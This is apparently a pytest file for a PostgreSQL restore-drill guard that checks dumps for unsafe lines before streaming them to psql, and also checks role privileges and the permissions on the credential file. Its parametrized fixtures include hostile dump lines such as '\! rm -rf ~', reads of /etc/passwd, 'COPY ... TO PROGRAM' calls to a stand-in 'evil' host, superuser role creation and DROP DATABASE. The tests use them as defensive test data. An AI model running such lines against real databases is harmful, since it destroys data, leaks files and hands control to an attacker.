"""Restore-drill guard (n8nmat/restore-drill-guard, 2026-10-09): adversarial dumps, role and credential guards.

Audit F (due diligence 2026-10-09) D4/D5: the drill piped a plain dump into psql trusting it to carry no
``\\connect`` / ``CREATE DATABASE``, and its role silently fell back to the live owner. These tests pin
the three layers that replace that trust: the line guard (scripts/lib/restore_dump_guard.py), psql's
``\\restrict`` mode under a per-run key, and the dedicated-role preflight. No database is touched: the
restore stream test swaps psql for a byte sink and keeps the real gzip producer.
"""

from __future__ import annotations

import gzip
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))

from scripts.lib import restore_dump_guard as rdg  # noqa: E402
from scripts import trade_ai_restore_drill as rd  # noqa: E402

CFG = json.loads((ROOT / "config" / "ops_lanes.json").read_text(encoding="utf-8"))["restore_drill"]

CLEAN = b"""--
-- PostgreSQL database dump
--

\\restrict AbC123dumpkey

SET statement_timeout = 0;
SELECT pg_catalog.set_config('search_path', '', false);
CREATE EXTENSION IF NOT EXISTS vector WITH SCHEMA public;
CREATE FUNCTION public.f() RETURNS text
    LANGUAGE plpgsql
    AS $_$
BEGIN
  RETURN 'x';
END
$_$;
CREATE TABLE public.paper_trades (id integer, note text);
CREATE TABLE "Odd"."Mixed Case" (id integer);
COPY public.paper_trades (id, note) FROM stdin;
1\tDROP DATABASE trade_ai in a data row is data
2\t\\\\connect also data
3\tCOPY x TO PROGRAM 'rm' still data
\\.
COPY "Odd"."Mixed Case" (id) FROM stdin;
\\.
CREATE INDEX ix ON public.paper_trades USING btree (id);

--
-- PostgreSQL database dump complete
--

\\unrestrict AbC123dumpkey
"""


def _lines(blob: bytes) -> list[bytes]:
    return blob.splitlines(keepends=True)


def _inject(after: bytes, line: bytes) -> bytes:
    return CLEAN.replace(after, after + line, 1)


# ============================================================================ line guard
def test_clean_dump_passes_and_counts_copy_rows_per_table():
    g, v = rdg.scan_lines(_lines(CLEAN))
    assert v is None
    assert g.copy_rows == {"public.paper_trades": 3, '"Odd"."Mixed Case"': 0}
    assert g.summary()["copy_blocks"] == 2 and g.summary()["dropped_meta_lines"] == 2


def test_dump_restrict_lines_are_dropped_not_forwarded():
    g = rdg.DumpGuard()
    forwarded = [out for out in (g.feed(ln) for ln in _lines(CLEAN)) if out is not None]
    assert not any(ln.startswith(b"\\restrict") or ln.startswith(b"\\unrestrict") for ln in forwarded)
    assert b"\\.\n" in forwarded  # COPY terminators still reach psql


@pytest.mark.parametrize(
    "line,rule",
    [
        (b"\\connect trade_ai\n", "meta_command"),
        (b"\\c trade_ai\n", "meta_command"),
        (b"\\c-trade_ai\n", "meta_command"),
        (b"\\! rm -rf ~\n", "meta_command"),
        (b"\\o /home/johnclaw/.bashrc\n", "meta_command"),
        (b"\\copy t TO '/tmp/x'\n", "meta_command"),
        (b"\\i /etc/passwd\n", "meta_command"),
        (b"\\set ON_ERROR_STOP 0\n", "meta_command"),
        (b"\\unrestrict AbC123dumpkey extra\n", "meta_command"),
        (b"SELECT 1 \\connect trade_ai\n", "meta_command_inline"),
        (b"SELECT 1; \\! id\n", "meta_command_inline"),
        (b"CREATE DATABASE trade_ai_copy;\n", "create_database"),
        (b"create   database x;\n", "create_database"),
        (b"DROP DATABASE trade_ai;\n", "drop_database"),
        (b"SELECT 1; DROP DATABASE IF EXISTS trade_ai;\n", "drop_database"),
        (b"ALTER DATABASE trade_ai SET search_path TO evil;\n", "alter_database"),
        (b"ALTER SYSTEM SET archive_command = 'curl evil';\n", "alter_system"),
        (b"CREATE ROLE evil SUPERUSER LOGIN;\n", "role_ddl"),
        (b"ALTER ROLE trade_ai PASSWORD 'x';\n", "role_ddl"),
        (b"DROP USER trade_ai;\n", "role_ddl"),
        (b"ALTER GROUP g ADD USER u;\n", "role_ddl"),
        (b"SET ROLE trade_ai;\n", "set_role"),
        (b"SET SESSION ROLE postgres;\n", "set_role"),
        (b"RESET ROLE;\n", "set_role"),
        (b"SET SESSION AUTHORIZATION trade_ai;\n", "session_authorization"),
        (b"SELECT pg_catalog.set_config('role', 'trade_ai', false);\n", "set_config_role"),
        (b"GRANT trade_ai TO restore_drill;\n", "grant_revoke"),
        (b"REVOKE ALL ON SCHEMA public FROM PUBLIC;\n", "grant_revoke"),
        (b"COPY public.paper_trades TO PROGRAM 'curl evil';\n", "copy_program"),
        (b"COPY public.paper_trades FROM '/etc/passwd';\n", "copy_not_from_stdin"),
        (b"COPY public.paper_trades TO STDOUT;\n", "copy_not_from_stdin"),
    ],
)
def test_adversarial_lines_outside_copy_data_are_refused(line, rule):
    g, v = rdg.scan_lines(_lines(_inject(b"SET statement_timeout = 0;\n", line)))
    assert v is not None and v.rule == rule, v
    # the offending line is reported with its position, never forwarded
    assert v.line_no == _lines(_inject(b"SET statement_timeout = 0;\n", line)).index(line) + 1


def test_forbidden_text_inside_a_function_body_is_refused_too():
    blob = CLEAN.replace(b"  RETURN 'x';\n", b"  EXECUTE 'DROP DATABASE trade_ai';\n")
    _g, v = rdg.scan_lines(_lines(blob))
    assert v is not None and v.rule == "drop_database"


def test_copy_line_inside_a_dollar_quoted_body_does_not_open_a_data_block():
    """A COPY-looking line in a function body must not make the guard skip the lines that follow."""
    body = b"  RETURN 'x';\n"
    smuggle = b"COPY public.paper_trades (id) FROM stdin;\nDROP DATABASE trade_ai;\n"
    _g, v = rdg.scan_lines(_lines(CLEAN.replace(body, body + smuggle)))
    assert v is not None and v.rule == "drop_database"


def test_dump_truncated_inside_copy_is_refused():
    blob = CLEAN.split(b"\\.\n", 1)[0]
    _g, v = rdg.scan_lines(_lines(blob))
    assert v is not None and v.rule == "truncated_in_copy"


def test_crlf_dump_lines_are_handled():
    _g, v = rdg.scan_lines(_lines(CLEAN.replace(b"\n", b"\r\n")))
    assert v is None
    _g, v = rdg.scan_lines(_lines(_inject(b"SET statement_timeout = 0;\n", b"\\connect trade_ai\r\n")))
    assert v is not None and v.rule == "meta_command"


def test_copy_table_key_matches_pg_dump_quoting():
    assert rdg.copy_table_key("public", "paper_trades") == "public.paper_trades"
    assert rdg.copy_table_key("Odd", "Mixed Case") == '"Odd"."Mixed Case"'


# ============================================================================ streamed restore (psql replaced by a sink)
def _sink_popen(sink: Path, calls: list):
    """Real producer (gzip -dc); psql swapped for a process that copies stdin to ``sink``."""

    def popen(argv, **kw):
        calls.append(list(argv))
        if "psql" in argv:
            code = "import sys,shutil; shutil.copyfileobj(sys.stdin.buffer, open(sys.argv[1], 'wb'))"
            kw.pop("env", None)
            return subprocess.Popen([sys.executable, "-c", code, str(sink)], **kw)
        return subprocess.Popen(argv, **kw)

    return popen


def _gz(tmp_path: Path, blob: bytes) -> Path:
    p = tmp_path / "trade_ai_20261101_023000.sql.gz"
    p.write_bytes(gzip.compress(blob))
    return p


PARAMS = {"host": "localhost", "port": 5432, "user": "trade_ai_drill", "password": "not-printed"}


def test_restore_stream_starts_with_the_run_key_and_forwards_the_clean_dump(tmp_path):
    sink, calls = tmp_path / "psql_stdin.sql", []
    r = rd.restore(
        _gz(tmp_path, CLEAN),
        "restore_drill_20261101",
        PARAMS,
        timeout=60,
        name_regex=CFG["db_name_regex"],
        popen=_sink_popen(sink, calls),
        key="runkey0123",
        tolerated=CFG["tolerated_error_regexes"],
    )
    sent = sink.read_bytes()
    assert sent.startswith(b"\\restrict runkey0123\n")
    assert b"AbC123dumpkey" not in sent  # the dump's own key never reaches psql
    assert r["guard_violation"] is None and r["rc"] == 0 and r["producer_rc"] == 0
    assert r["copy_rows"]["public.paper_trades"] == 3
    psql_argv = next(a for a in calls if "psql" in a)
    assert psql_argv[psql_argv.index("-d") + 1] == "restore_drill_20261101" and "-X" in psql_argv
    assert "not-printed" not in " ".join(psql_argv)


def test_restore_stream_never_forwards_the_violating_line_and_kills_psql(tmp_path):
    sink, calls = tmp_path / "psql_stdin.sql", []
    blob = _inject(
        b"CREATE INDEX ix ON public.paper_trades USING btree (id);\n",
        b"\\connect trade_ai\nDROP TABLE public.paper_trades;\n",
    )
    r = rd.restore(
        _gz(tmp_path, blob),
        "restore_drill_20261101",
        PARAMS,
        timeout=60,
        name_regex=CFG["db_name_regex"],
        popen=_sink_popen(sink, calls),
        key="runkey0123",
    )
    assert r["guard_violation"]["rule"] == "meta_command"
    sent = sink.read_bytes() if sink.exists() else b""
    assert b"\\connect" not in sent and b"DROP TABLE" not in sent
    assert r["rc"] != 0  # psql was killed, not allowed to drain to EOF
    assert {
        f["item"]
        for f in rd.findings_for(
            {"would_run": True, "db_name": "restore_drill_20261101"},
            {"restore": r, "comparison": [], "created": True, "dropped": True},
        )
    } == {"dump:guard_violation"}


def test_restore_refuses_a_target_that_is_not_a_throwaway(tmp_path):
    for target in ("trade_ai", "postgres", "restore_drill_template", "restore_drill_２０２６１１０１"):
        with pytest.raises(rd.DrillRefused):
            rd.restore(
                _gz(tmp_path, CLEAN),
                target,
                PARAMS,
                timeout=5,
                name_regex=CFG["db_name_regex"],
                popen=lambda *a, **k: 1 / 0,
            )


def test_prescan_reports_violation_and_clean(tmp_path):
    clean = rd.prescan(_gz(tmp_path, CLEAN), timeout=60)
    assert clean["ok"] is True and clean["copy_rows"]["public.paper_trades"] == 3
    bad = rd.prescan(_gz(tmp_path, _inject(b"SET statement_timeout = 0;\n", b"CREATE DATABASE x;\n")), timeout=60)
    assert bad["ok"] is False and bad["violation"]["rule"] == "create_database"
    p = {"preconditions": {"dump_present": True}, "would_run": True}
    rd.apply_prescan(p, bad)
    assert p["would_run"] is False and "copy_rows" not in p["dump_guard"]
    f = rd.findings_for(dict(p, db_name="restore_drill_20261101"), None)
    assert (f[0]["item"], f[0]["severity"]) == ("refused:dump_guard", "P1") and "create_database" in f[0]["detail"]


def test_prescan_rejects_a_corrupt_gzip(tmp_path):
    p = tmp_path / "trade_ai_20261101_023000.sql.gz"
    p.write_bytes(gzip.compress(CLEAN)[:-12])
    assert rd.prescan(p, timeout=60)["ok"] is False


def test_custom_format_dump_is_rendered_by_pg_restore_to_stdout_only():
    argv = rd.producer_argv(Path("/x/trade_ai_20261101.dump"))
    assert argv[0] == "pg_restore" and "-f" in argv and argv[argv.index("-f") + 1] == "-"
    assert "-d" not in argv and "-C" not in argv and "--create" not in argv
    assert {"--no-owner", "--no-acl"} <= set(argv)


# ============================================================================ role, credentials, psql
@pytest.mark.parametrize(
    "user,row,live_user,ok",
    [
        ("trade_ai_drill", (True, False, False, False, False, False), "trade_ai", True),
        ("trade_ai", (True, False, False, False, False, True), "trade_ai", False),  # live user
        ("drill", (True, False, False, False, False, True), "trade_ai", False),  # member of live owner
        ("drill", (True, True, False, False, False, False), "trade_ai", False),  # superuser
        ("drill", (True, False, True, False, False, False), "trade_ai", False),  # createrole
        ("drill", (True, False, False, True, False, False), "trade_ai", False),  # replication
        ("drill", (True, False, False, False, True, False), "trade_ai", False),  # bypassrls
        ("drill", (False, False, False, False, False, False), "trade_ai", False),  # no createdb
        ("drill", None, "trade_ai", False),  # role absent
        (None, None, "trade_ai", False),  # not configured
    ],
)
def test_role_verdict_requires_a_dedicated_createdb_only_role(user, row, live_user, ok):
    v = rd.role_verdict(user, row, live_user=live_user)
    assert (v["configured"] and v["dedicated"] and v["createdb"] and v["unprivileged"]) is ok


def test_drill_params_never_fall_back_to_the_live_user(tmp_path):
    cfg = dict(CFG, role_credentials_file=str(tmp_path / "absent.env"))
    live = {"host": "localhost", "port": 5432, "user": "trade_ai", "password": "live-secret"}
    params, src = rd.drill_db_params(cfg, live, env={"DB_USER": "trade_ai", "DB_PASSWORD": "live-secret"})
    assert params["user"] is None and params["password"] == "" and src["file_status"] == "absent"


def test_drill_params_read_a_0600_file_and_refuse_a_readable_one(tmp_path):
    f = tmp_path / "restore_drill_db.env"
    f.write_text(f"{CFG['role_user_env']}=trade_ai_drill\n{CFG['role_password_env']}='s3cret'\n", encoding="utf-8")
    cfg = dict(CFG, role_credentials_file=str(f))
    live = {"host": "localhost", "port": 5432}
    os.chmod(f, 0o600)
    params, src = rd.drill_db_params(cfg, live, env={})
    assert (params["user"], params["password"], src["file_status"], src["user_from"]) == (
        "trade_ai_drill",
        "s3cret",
        "read",
        "file",
    )
    assert "s3cret" not in json.dumps(src)
    os.chmod(f, 0o644)
    params, src = rd.drill_db_params(cfg, live, env={})
    assert params["user"] is None and src["file_status"] == "refused_mode_not_0600"
    params, _ = rd.drill_db_params(cfg, live, env={CFG["role_user_env"]: "from_env", CFG["role_password_env"]: "p"})
    assert params["user"] == "from_env" and params["dbname"] == "postgres"


@pytest.mark.parametrize(
    "text,ok",
    [
        ("psql (PostgreSQL) 18.6 (Ubuntu)", True),
        ("psql (PostgreSQL) 17.6", True),
        ("psql (PostgreSQL) 17.5", False),
        ("psql (PostgreSQL) 16.10", True),
        ("psql (PostgreSQL) 16.9", False),
        ("psql (PostgreSQL) 19.0", True),
        ("psql (PostgreSQL) 12.22", False),
        (None, False),
        ("garbage", False),
    ],
)
def test_psql_restrict_support_floor(text, ok):
    assert rd.psql_restrict_supported(text, CFG["psql_restrict_min_versions"]) is ok


# ============================================================================ row counts + names
def test_counts_must_equal_dump_copy_rows_and_fall_back_to_live_tolerance():
    rows = [
        {"schema": "public", "table": "a", "live_estimate": 100, "restored_rows": 90},
        {"schema": "public", "table": "b", "live_estimate": 100, "restored_rows": 89},
        {"schema": "public", "table": "c", "live_estimate": 100000, "restored_rows": 99000},
        {"schema": "public", "table": "d", "live_estimate": 10, "restored_rows": None},
    ]
    out = {c["table"]: c for c in rd.compare_counts(rows, CFG, {"public.a": 90, "public.b": 90, "public.d": 10})}
    assert out["a"]["ok"] and out["a"]["basis"] == "dump_copy_rows"
    assert not out["b"]["ok"]  # one row short of what the dump carried
    assert out["c"]["ok"] and out["c"]["basis"] == "live_estimate"
    assert not out["d"]["ok"]


def test_name_guard_is_ascii_only():
    assert not rd._name_ok("restore_drill_２０２６１１０１", CFG["db_name_regex"])
    assert not rd._name_ok("restore_drill_template", CFG["db_name_regex"])
    with pytest.raises(rd.DrillRefused):
        rd.assert_droppable(
            "restore_drill_２０２６１１０１",
            created_name="restore_drill_２０２６１１０１",
            comment=rd.COMMENT_PREFIX + "r1",
            run_id="r1",
            regex=CFG["db_name_regex"],
        )


def test_template_db_can_never_be_dropped_by_the_drill():
    with pytest.raises(rd.DrillRefused):
        rd.assert_droppable(
            CFG["template_db"],
            created_name=CFG["template_db"],
            comment=rd.COMMENT_PREFIX + "r1",
            run_id="r1",
            regex=CFG["db_name_regex"],
        )
